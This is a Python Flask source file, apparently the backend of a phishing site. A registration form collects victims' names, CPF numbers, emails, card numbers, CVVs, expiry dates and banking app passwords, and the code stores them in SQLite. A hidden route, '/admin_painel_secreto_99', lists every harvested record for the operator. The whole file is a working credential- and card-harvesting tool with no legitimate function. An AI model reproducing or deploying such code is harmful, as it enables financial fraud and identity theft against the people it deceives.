import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Mudei o nome para v4 para garantir que o Render crie um banco NOVO e limpo
DB_NAME = 'dados_final_v4.db'

def init_db():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS clientes 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, 
             nome TEXT, cpf TEXT, email TEXT, 
             num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro banco: {e}")

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        nome = request.form.get('nome')
        cpf = request.form.get('cpf')
        email = request.form.get('email')
        cartao = request.form.get('num_cartao')
        senha = request.form.get('senha_app')
        cvv = request.form.get('cvv')
        validade = request.form.get('validade')
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
                          VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro ao salvar: {e}")
    return redirect(url_for('sucesso'))

@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')

@app.route('/admin_painel_secreto_99')
def admin():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM clientes ORDER BY id DESC')
        usuarios = cursor.fetchall()
        conn.close()
        return render_template('admin.html', usuarios=usuarios)
    except Exception as e:
        return f"Erro ao carregar painel: {e}"

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)






